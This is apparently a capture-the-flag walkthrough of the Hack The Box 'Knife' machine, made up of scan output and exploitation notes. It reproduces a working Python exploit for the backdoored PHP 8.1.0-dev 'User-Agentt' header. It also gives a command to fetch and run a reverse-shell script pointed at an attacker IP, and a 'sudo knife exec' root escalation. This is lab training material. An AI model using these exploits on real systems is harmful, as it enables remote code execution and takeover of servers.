- ping machine
```bash
┌──(kali㉿kali)-[~]
└─$ ping 10.10.10.242                    
PING 10.10.10.242 (10.10.10.242) 56(84) bytes of data.
64 bytes from 10.10.10.242: icmp_seq=1 ttl=63 time=55.2 ms
64 bytes from 10.10.10.242: icmp_seq=2 ttl=63 time=57.4 ms
64 bytes from 10.10.10.242: icmp_seq=3 ttl=63 time=58.8 ms
^C
--- 10.10.10.242 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 55.189/57.109/58.770/1.473 ms
```
- nmap for open ports
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- -T4 --open -Pn -vvv 10.10.10.242 -oN knifeNmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 16:52 EST
Initiating Parallel DNS resolution of 1 host. at 16:52
Completed Parallel DNS resolution of 1 host. at 16:52, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 16:52
Scanning 10.10.10.242 [65535 ports]
Discovered open port 22/tcp on 10.10.10.242
Discovered open port 80/tcp on 10.10.10.242
Completed SYN Stealth Scan at 16:52, 17.75s elapsed (65535 total ports)
Nmap scan report for 10.10.10.242
Host is up, received user-set (0.057s latency).
Scanned at 2024-12-28 16:52:30 EST for 17s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds
           Raw packets sent: 65697 (2.891MB) | Rcvd: 65535 (2.621MB)
```
	- document
- nmap for services and versions running on open ports
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 10.10.10.242 -oN knifeNmapServicesVersions.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 16:55 EST
Nmap scan report for 10.10.10.242
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds
```
	- document
- Gobuster to enumerate website if machine has 80 or 443
	- `gobuster dir -u http://precious.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
	```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.242 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o knifeGobuster.txt -t 10 -x .php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.242
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 5815]
Progress: 163286 / 163288 (100.00%)
===============================================================
Finished
===============================================================
```
- View header on index.php with `curl -I`
	- reveals PHP version 8.1.0-dev 
	```bash
┌──(kali㉿kali)-[~/htb/knife]
└─$ curl -I http://10.10.10.242                                                     
HTTP/1.1 200 OK
Date: Sun, 29 Dec 2024 15:45:57 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8

```

- searching searchsploit for php/8.1.0-dev
	- susceptible to RCE

```bash
┌──(kali㉿kali)-[~]                                                                  
└─$ searchsploit php 8.1.0-dev                                                                                                                  
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path                           
-------------------------------------------------------------------------------------------------------------- ---------------------------------
...
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                           | php/webapps/49933.py
...

┌──(kali㉿kali)-[~/htb/knife]                                                     
└─$ cat 49933.py                                                                                                                                
# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                            
# Date: 23 may 2021                                                                                                                             
# Exploit Author: flast101                                                                                                                      
# Vendor Homepage: https://www.php.net/                                                                                                         
# Software Link:                                                                                                                                
#     - https://hub.docker.com/r/phpdaily/php                                                                                                   
#    - https://github.com/phpdaily/php                                                                                                          
# Version: 8.1.0-dev                                                                                                                            
# Tested on: Ubuntu 20.04                                                                                                                       
# References:                                                                                                                                   
#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a                                                           
#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md                                                             
                                                                                                                                                
"""                                                                                                                                             
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/                                                                                    
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py                                            
Contact: flast101.sec@gmail.com                                                                                                                 

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and 
removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""
#!/usr/bin/env python3                                                                                                                          
import os                                                                                                                                       
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit
else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit

```
- search for exploits, RCEs, etc on service's versions running on those open ports
	- SearchSploit
	- Metaspolit
	- document

- Searching GH for exploits reveals 
- PHP 8.1.0-dev Backdoor Remote Code Execution
	- [php-8.1.0-dev-backdoor-rce](https://github.com/flast101/php-8.1.0-dev-backdoor-rce?tab=readme-ov-file)
	- `curl -O https://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/refs/heads/main/revshell_php_8.1.0-dev.py`
	- `python3 revshell_php_8.1.0-dev.py <target URL> <attacker IP> <attacker PORT>`
		- spawns reverse shell
		- into james user 
			- cat user.txt
- sudo -l reveals that james can run /usr/bin/knife as root
- consulting gtfo bins https://gtfobins.github.io/gtfobins/knife/
	- reveals it can be used to break out from restricted environments but spawning a interactive system shell. 
		- `knife exec -E 'exec "/bin/sh"'`
		- navigating to home to pull root.txt flag
- Foothold
	- sudo -l














